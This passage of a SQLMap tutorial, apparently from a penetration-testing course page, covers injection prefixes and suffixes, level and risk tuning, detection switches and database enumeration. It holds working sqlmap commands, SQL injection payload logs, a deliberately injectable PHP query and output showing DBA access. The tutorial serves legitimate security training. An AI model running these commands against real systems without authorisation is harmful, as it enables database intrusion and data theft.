+<li>boundaries (e.g. <code>'&lt;vector&gt;-- -</code>): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.</li>
+</ul>
+<hr>
+<h3 id="prefix-suffix">Prefix/Suffix</h3>
+<p>There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.\
+For such runs, options <code>--prefix</code> and <code>--suffix</code> can be used as follows:</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash">sqlmap -u <span class="hljs-string">"www.example.com/?q=test"</span> --<span class="hljs-built_in">prefix</span>=<span class="hljs-string">"%'))"</span> --suffix=<span class="hljs-string">"-- -"</span>
+</code></pre>
+<p>This will result in an enclosure of all vector values between the static prefix <code>%'))</code> and the suffix <code>-- -</code>.\
+For example, if the vulnerable code at the target is:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">$query = "<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">name</span>,surname <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">LIKE</span> ((<span class="hljs-string">'" . $_GET["q"] . "'</span>)) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">";
+$result = mysqli_query($link, $query);</span>
+</code></pre>
+<p>The vector <code>UNION ALL SELECT 1,2,VERSION()</code>, bounded with the prefix <code>%'))</code> and the suffix <code>-- -</code>, will result in the following (valid) SQL statement at the target:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">name</span>,surname <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">LIKE</span> ((<span class="hljs-string">'test%'</span>)) <span class="hljs-keyword">UNION</span> ALL <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">VERSION</span>()<span class="hljs-comment">-- -')) LIMIT 0,1</span>
+</code></pre>
+<hr>
+<h3 id="level-risk">Level/Risk</h3>
+<p>By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.</p>
+<p>For such demands, the options <code>--level</code> and <code>--risk</code> should be used:</p>
+<ul>
+<li>The option <code>--level</code> (<code>1-5</code>, default <code>1</code>) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).</li>
+<li>The option <code>--risk</code> (<code>1-3</code>, default <code>1</code>) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).</li>
+</ul>
+<p>The best way to check for differences between used boundaries and payloads for different values of <code>--level</code> and <code>--risk</code>, is the usage of <code>-v</code> option to set the verbosity level. In verbosity 3 or higher (e.g. <code>-v 3</code>), messages containing the used <code>[PAYLOAD]</code> will be displayed, as follows:</p>
+<p>Attack Tuning</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u www.example.com/?id=<span class="hljs-number">1</span> -v <span class="hljs-number">3</span> <span class="hljs-comment">--level=5</span>
+
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [INFO] testing <span class="hljs-symbol">'AND</span> <span class="hljs-built_in">boolean</span>-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause'
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [PAYLOAD] <span class="hljs-number">1</span>) <span class="hljs-keyword">AND</span> <span class="hljs-number">5907</span>=<span class="hljs-number">7031</span><span class="hljs-comment">-- AuiO</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [PAYLOAD] <span class="hljs-number">1</span>) <span class="hljs-keyword">AND</span> <span class="hljs-number">7891</span>=<span class="hljs-number">5700</span> <span class="hljs-keyword">AND</span> (<span class="hljs-number">3236</span>=<span class="hljs-number">3236</span>
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [PAYLOAD] <span class="hljs-number">1</span>')) <span class="hljs-keyword">AND</span> <span class="hljs-number">1049</span>=<span class="hljs-number">6686</span> <span class="hljs-keyword">AND</span> ((<span class="hljs-symbol">'OoWT</span>' LIKE <span class="hljs-symbol">'OoWT</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [PAYLOAD] <span class="hljs-number">1</span>'))) <span class="hljs-keyword">AND</span> <span class="hljs-number">4534</span>=<span class="hljs-number">9645</span> <span class="hljs-keyword">AND</span> (((<span class="hljs-symbol">'DdNs</span>' LIKE <span class="hljs-symbol">'DdNs</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [PAYLOAD] <span class="hljs-number">1</span>%' <span class="hljs-keyword">AND</span> <span class="hljs-number">7681</span>=<span class="hljs-number">3258</span> <span class="hljs-keyword">AND</span> <span class="hljs-symbol">'hPZg</span>%'=<span class="hljs-symbol">'hPZg</span>
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [PAYLOAD] <span class="hljs-number">1</span><span class="hljs-string">")) AND 4540=7088 AND (("</span>hUye<span class="hljs-string">"="</span>hUye
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [PAYLOAD] <span class="hljs-number">1</span><span class="hljs-string">"))) AND 6823=7134 AND ((("</span>aWZj<span class="hljs-string">"="</span>aWZj
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [PAYLOAD] <span class="hljs-number">1</span><span class="hljs-string">" AND 7613=7254 AND "</span>NMxB<span class="hljs-string">"="</span>NMxB
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [PAYLOAD] <span class="hljs-number">1</span><span class="hljs-string">"="</span><span class="hljs-number">1</span><span class="hljs-string">" AND 3219=7390 AND "</span><span class="hljs-number">1</span><span class="hljs-string">"="</span><span class="hljs-number">1</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [PAYLOAD] <span class="hljs-number">1</span>' <span class="hljs-keyword">IN</span> <span class="hljs-built_in">BOOLEAN</span> MODE) <span class="hljs-keyword">AND</span> <span class="hljs-number">1847</span>=<span class="hljs-number">8795</span>#
+[<span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">07</span>] [INFO] testing <span class="hljs-symbol">'AND</span> <span class="hljs-built_in">boolean</span>-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause (subquery - comment)'
+</code></pre>
+<p>On the other hand, payloads used with the default <code>--level</code> value have a considerably smaller set of boundaries:</p>
+<p>Attack Tuning</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u www.example.com/?id=<span class="hljs-number">1</span> -v <span class="hljs-number">3</span>
+...<span class="hljs-symbol">SNIP</span>...
+[<span class="hljs-number">14</span>:<span class="hljs-number">20</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">INFO</span>] testing <span class="hljs-string">'AND boolean-based blind - WHERE or HAVING clause'</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">20</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>) <span class="hljs-symbol">AND</span> <span class="hljs-number">2678</span>=<span class="hljs-number">8644</span> <span class="hljs-symbol">AND</span> (<span class="hljs-number">3836</span>=<span class="hljs-number">3836</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">20</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span> <span class="hljs-symbol">AND</span> <span class="hljs-number">7496</span>=<span class="hljs-number">4313</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">20</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span> <span class="hljs-symbol">AND</span> <span class="hljs-number">7036</span>=<span class="hljs-number">6691</span>-- <span class="hljs-symbol">DmQN</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">20</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-string">') AND 9393=3783 AND ('</span><span class="hljs-symbol">SgYz</span><span class="hljs-string">'='</span><span class="hljs-symbol">SgYz</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">20</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-string">' AND 6214=3411 AND '</span><span class="hljs-symbol">BhwY</span><span class="hljs-string">'='</span><span class="hljs-symbol">BhwY</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">20</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">INFO</span>] testing <span class="hljs-string">'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'</span>
+</code></pre>
+<p>As for vectors, we can compare used payloads as follows:</p>
+<p>Attack Tuning</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u www.example.com/?<span class="hljs-attr">id=</span><span class="hljs-number">1</span>
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">42</span>:<span class="hljs-number">38</span>] [<span class="hljs-literal">INF</span>O] testing '<span class="hljs-keyword">AND</span> boolean-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause'
+[<span class="hljs-number">14</span>:<span class="hljs-number">42</span>:<span class="hljs-number">38</span>] [<span class="hljs-literal">INF</span>O] testing '<span class="hljs-keyword">OR</span> boolean-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause'
+[<span class="hljs-number">14</span>:<span class="hljs-number">42</span>:<span class="hljs-number">38</span>] [<span class="hljs-literal">INF</span>O] testing 'MySQL &gt;= <span class="hljs-number">5.0</span> <span class="hljs-keyword">AND</span> error-based - WHERE, HAVING, <span class="hljs-keyword">ORDER</span> <span class="hljs-title">BY</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-title">BY</span> clause (FLOOR)'
+...SNIP...
+</code></pre>
+<p>Attack Tuning</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u www.example.com/?id=<span class="hljs-number">1</span> <span class="hljs-comment">--level=5 --risk=3</span>
+
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">03</span>] [INFO] testing <span class="hljs-symbol">'AND</span> <span class="hljs-built_in">boolean</span>-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause'
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">03</span>] [INFO] testing <span class="hljs-symbol">'OR</span> <span class="hljs-built_in">boolean</span>-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause'
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">03</span>] [INFO] testing <span class="hljs-symbol">'OR</span> <span class="hljs-built_in">boolean</span>-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause (<span class="hljs-keyword">NOT</span>)'
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">05</span>] [INFO] testing <span class="hljs-symbol">'PostgreSQL</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">boolean</span>-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause (CAST)'
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">05</span>] [INFO] testing <span class="hljs-symbol">'PostgreSQL</span> <span class="hljs-keyword">OR</span> <span class="hljs-built_in">boolean</span>-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause (CAST)'
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">05</span>] [INFO] testing <span class="hljs-symbol">'Oracle</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">boolean</span>-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause (CTXSYS.DRITHSX.SN)'
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">05</span>] [INFO] testing <span class="hljs-symbol">'MySQL</span> &lt; <span class="hljs-number">5.0</span> <span class="hljs-built_in">boolean</span>-based blind - ORDER BY, <span class="hljs-keyword">GROUP</span> BY clause'
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">05</span>] [INFO] testing <span class="hljs-symbol">'MySQL</span> &lt; <span class="hljs-number">5.0</span> <span class="hljs-built_in">boolean</span>-based blind - ORDER BY, <span class="hljs-keyword">GROUP</span> BY clause (original value)'
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">05</span>] [INFO] testing <span class="hljs-symbol">'PostgreSQL</span> <span class="hljs-built_in">boolean</span>-based blind - ORDER BY clause (original value)'
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">05</span>] [INFO] testing <span class="hljs-symbol">'SAP</span> MaxDB <span class="hljs-built_in">boolean</span>-based blind - Stacked queries'
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">06</span>] [INFO] testing <span class="hljs-symbol">'MySQL</span> &gt;= <span class="hljs-number">5.5</span> <span class="hljs-keyword">AND</span> <span class="hljs-literal">error</span>-based - WHERE, HAVING, ORDER BY <span class="hljs-keyword">or</span> <span class="hljs-keyword">GROUP</span> BY clause (BIGINT <span class="hljs-built_in">UNSIGNED</span>)'
+[<span class="hljs-number">14</span>:<span class="hljs-number">46</span>:<span class="hljs-number">06</span>] [INFO] testing <span class="hljs-symbol">'MySQL</span> &gt;= <span class="hljs-number">5.5</span> <span class="hljs-keyword">OR</span> <span class="hljs-literal">error</span>-based - WHERE <span class="hljs-keyword">or</span> HAVING clause (EXP)'
+...SNIP...
+</code></pre>
+<p>As for the number of payloads, by default (i.e. <code>--level=1 --risk=1</code>), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (<code>--level=5 --risk=3</code>) the number of payloads increases to 7,865.</p>
+<p>As SQLMap is already tuned to check for the most common boundaries and vectors, regular users are advised not to touch these options because it will make the whole detection process considerably slower. Nevertheless, in special cases of SQLi vulnerabilities, where usage of <code>OR</code> payloads is a must (e.g., in case of <code>login</code> pages), we may have to raise the risk level ourselves.</p>
+<p>This is because <code>OR</code> payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements (although less commonly) are actively modifying the database content (e.g. <code>DELETE</code> or <code>UPDATE</code>).</p>
+<hr>
+<h3 id="advanced-tuning">Advanced Tuning</h3>
+<p>To further fine-tune the detection mechanism, there is a hefty set of switches and options. In regular cases, SQLMap will not require its usage. Still, we need to be familiar with them so that we could use them when needed.</p>
+<p><strong>Status Codes</strong></p>
+<p>For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between <code>TRUE</code> and <code>FALSE</code> responses could be used for detection purposes. If the difference between <code>TRUE</code> and <code>FALSE</code> responses can be seen in the HTTP codes (e.g. <code>200</code> for <code>TRUE</code> and <code>500</code> for <code>FALSE</code>), the option <code>--code</code> could be used to fixate the detection of <code>TRUE</code> responses to a specific HTTP code (e.g. <code>--code=200</code>).</p>
+<p><strong>Titles</strong></p>
+<p>If the difference between responses can be seen by inspecting the HTTP page titles, the switch <code>--titles</code> could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag <code>&lt;title&gt;</code>.</p>
+<p><strong>Strings</strong></p>
+<p>In case of a specific string value appearing in <code>TRUE</code> responses (e.g. <code>success</code>), while absent in <code>FALSE</code> responses, the option <code>--string</code> could be used to fixate the detection based only on the appearance of that single value (e.g. <code>--string=success</code>).</p>
+<p><strong>Text-only</strong></p>
+<p>When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;meta&gt;</code>, etc.), we can use the <code>--text-only</code> switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.</p>
+<p><strong>Techniques</strong></p>
+<p>In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option <code>--technique</code> can specify the SQLi technique to be used.</p>
+<p>For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with <code>--technique=BEU</code>.</p>
+<p><strong>UNION SQLi Tuning</strong></p>
+<p>In some cases, <code>UNION</code> SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option <code>--union-cols</code> (e.g. <code>--union-cols=17</code>). In case that the default "dummy" filling values used by SQLMap -<code>NULL</code> and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. <code>--union-char='a'</code>).</p>
+<p>Furthermore, in case there is a requirement to use an appendix at the end of a <code>UNION</code> query in the form of the <code>FROM &lt;table&gt;</code> (e.g., in case of Oracle), we can set it with the option <code>--union-from</code> (e.g. <code>--union-from=users</code>).\
+Failing to use the proper <code>FROM</code> appendix automatically could be due to the inability to detect the DBMS name before its usage.</p>
+<p>\</p>
+<h2 id="database-enumeration">Database Enumeration</h2>
+<hr>
+<p>Enumeration represents the central part of an SQL injection attack, which is done right after the successful detection and confirmation of exploitability of the targeted SQLi vulnerability. It consists of lookup and retrieval (i.e., exfiltration) of all the available information from the vulnerable database.</p>
+<hr>
+<h3 id="sqlmap-data-exfiltration">SQLMap Data Exfiltration</h3>
+<p>For such purpose, SQLMap has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content. For example, the excerpts from <a href="https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml">queries.xml</a> for a MySQL DBMS can be seen below:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"MySQL"</span>&gt;</span>
+        <span class="hljs-comment">&lt;!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html --&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">cast</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"CAST(%s AS NCHAR)"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">length</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"CHAR_LENGTH(%s)"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">isnull</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"IFNULL(%s,' ')"</span>/&gt;</span>
+...SNIP...
+        <span class="hljs-tag">&lt;<span class="hljs-name">banner</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"VERSION()"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">current_user</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"CURRENT_USER()"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">current_db</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"DATABASE()"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">hostname</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"@@HOSTNAME"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">table_comment</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">column_comment</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">is_dba</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">check_udf</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">inband</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES"</span> <span class="hljs-attr">query2</span>=<span class="hljs-string">"SELECT user FROM mysql.user"</span> <span class="hljs-attr">query3</span>=<span class="hljs-string">"SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"</span>/&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">blind</span> <span class="hljs-attr">query</span>=<span class="hljs-string">"SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1"</span> <span class="hljs-attr">query2</span>=<span class="hljs-string">"SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1"</span> <span class="hljs-attr">query3</span>=<span class="hljs-string">"SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1"</span> <span class="hljs-attr">count</span>=<span class="hljs-string">"SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES"</span> <span class="hljs-attr">count2</span>=<span class="hljs-string">"SELECT COUNT(DISTINCT(user)) FROM mysql.user"</span> <span class="hljs-attr">count3</span>=<span class="hljs-string">"SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span>
+    ...SNIP...
+</code></pre>
+<p>For example, if a user wants to retrieve the "banner" (switch <code>--banner</code>) for the target based on MySQL DBMS, the <code>VERSION()</code> query will be used for such purpose.\
+In case of retrieval of the current user name (switch <code>--current-user</code>), the <code>CURRENT_USER()</code> query will be used.</p>
+<p>Another example is retrieving all the usernames (i.e., tag <code>&lt;users&gt;</code>). There are two queries used, depending on the situation. The query marked as <code>inband</code> is used in all non-blind situations (i.e., UNION-query and error-based SQLi), where the query results can be expected inside the response itself. The query marked as <code>blind</code>, on the other hand, is used for all blind situations, where data has to be retrieved row-by-row, column-by-column, and bit-by-bit.</p>
+<hr>
+<h3 id="basic-db-data-enumeration">Basic DB Data Enumeration</h3>
+<p>Usually, after a successful detection of an SQLi vulnerability, we can begin the enumeration of basic details from the database, such as the hostname of the vulnerable target (<code>--hostname</code>), current user's name (<code>--current-user</code>), current database name (<code>--current-db</code>), or password hashes (<code>--passwords</code>). SQLMap will skip SQLi detection if it has been identified earlier and directly start the DBMS enumeration process.</p>
+<p>Enumeration usually starts with the retrieval of the basic information:</p>
+<ul>
+<li>Database version banner (switch <code>--banner</code>)</li>
+<li>Current user name (switch <code>--current-user</code>)</li>
+<li>Current database name (switch <code>--current-db</code>)</li>
+<li>Checking if the current user has DBA (administrator) rights.</li>
+</ul>
+<p>The following SQLMap command does all of the above:</p>
+<p>Database Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u <span class="hljs-string">"http://www.example.com/?id=1"</span> --banner --current-<span class="hljs-keyword">user</span> <span class="hljs-title">--current-db</span> --is-dba
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {<span class="hljs-number">1.4</span>.<span class="hljs-number">9</span>}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ <span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">57</span> /<span class="hljs-number">2020</span>-<span class="hljs-number">09</span>-<span class="hljs-number">17</span>/
+
+[<span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">57</span>] [<span class="hljs-literal">INF</span>O] resuming back-end DBMS 'mysql' 
+[<span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">57</span>] [<span class="hljs-literal">INF</span>O] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    <span class="hljs-keyword">Type</span>: boolean-based blind
+    Title: <span class="hljs-keyword">AND</span> boolean-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause
+    Payload: <span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">5134</span>=<span class="hljs-number">5134</span>
+
+    <span class="hljs-keyword">Type</span>: error-based
+    Title: MySQL &gt;= <span class="hljs-number">5.0</span> <span class="hljs-keyword">AND</span> error-based - WHERE, HAVING, <span class="hljs-keyword">ORDER</span> <span class="hljs-title">BY</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-title">BY</span> clause (FLOOR)
+    Payload: <span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> (SELECT <span class="hljs-number">5907</span> FROM(SELECT COUNT(*),CONCAT(<span class="hljs-number">0</span>x7170766b71,(SELECT (ELT(<span class="hljs-number">5907</span>=<span class="hljs-number">5907</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">0</span>x7178707671,FLOOR(RAND(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x FROM <span class="hljs-literal">INF</span>ORMATION_SCHEMA.PLUGINS <span class="hljs-keyword">GROUP</span> <span class="hljs-title">BY</span> x)a)
+
+    <span class="hljs-keyword">Type</span>: UNION query
+    Title: Generic UNION query (NULL) - <span class="hljs-number">3</span> columns
+    Payload: <span class="hljs-attr">id=</span><span class="hljs-number">1</span> UNION ALL SELECT NULL,NULL,CONCAT(<span class="hljs-number">0</span>x7170766b71,<span class="hljs-number">0</span>x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,<span class="hljs-number">0</span>x7178707671)-- -
+---
+[<span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">57</span>] [<span class="hljs-literal">INF</span>O] the back-end DBMS is MySQL
+[<span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">57</span>] [<span class="hljs-literal">INF</span>O] fetching banner
+web application technology: PHP <span class="hljs-number">5.2</span>.<span class="hljs-number">6</span>, Apache <span class="hljs-number">2.2</span>.<span class="hljs-number">9</span>
+back-end DBMS: MySQL &gt;= <span class="hljs-number">5.0</span>
+banner: '<span class="hljs-number">5.1</span>.<span class="hljs-number">41</span>-<span class="hljs-number">3</span>~bpo50+<span class="hljs-number">1</span>'
+[<span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">58</span>] [<span class="hljs-literal">INF</span>O] fetching current <span class="hljs-keyword">user</span>
+<span class="hljs-title">current</span> user: 'root@%'
+[<span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">58</span>] [<span class="hljs-literal">INF</span>O] fetching current database
+current database: 'testdb'
+[<span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">58</span>] [<span class="hljs-literal">INF</span>O] testing if current <span class="hljs-keyword">user</span> <span class="hljs-title">is</span> DBA
+[<span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">58</span>] [<span class="hljs-literal">INF</span>O] fetching current <span class="hljs-keyword">user</span>
+<span class="hljs-title">current</span> <span class="hljs-keyword">user</span> <span class="hljs-title">is</span> DBA: <span class="hljs-literal">True</span>
+[<span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">58</span>] [<span class="hljs-literal">INF</span>O] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'
+
+[*] ending @ <span class="hljs-number">13</span>:<span class="hljs-number">30</span>:<span class="hljs-number">58</span> /<span class="hljs-number">2020</span>-<span class="hljs-number">09</span>-<span class="hljs-number">17</span>/
+</code></pre>
+<p>From the above example, we can see that the database version is quite old (MySQL 5.1.41 - from November 2009), and the current user name is <code>root</code>, while the current database name is <code>testdb</code>.</p>
+<p>Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.</p>
+<hr>
+<h3 id="table-enumeration">Table Enumeration</h3>
+<p>In most common scenarios, after finding the current database name (i.e. <code>testdb</code>), the retrieval of table names would be by using the <code>--tables</code> option and specifying the DB name with <code>-D testdb</code>, is as follows:</p>
+<p>Database Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-string">$ </span>sqlmap -u <span class="hljs-comment">"http://www.example.com/?id=1"</span> --tables -<span class="hljs-type">D</span> testdb
+
+...<span class="hljs-type">SNIP</span>...
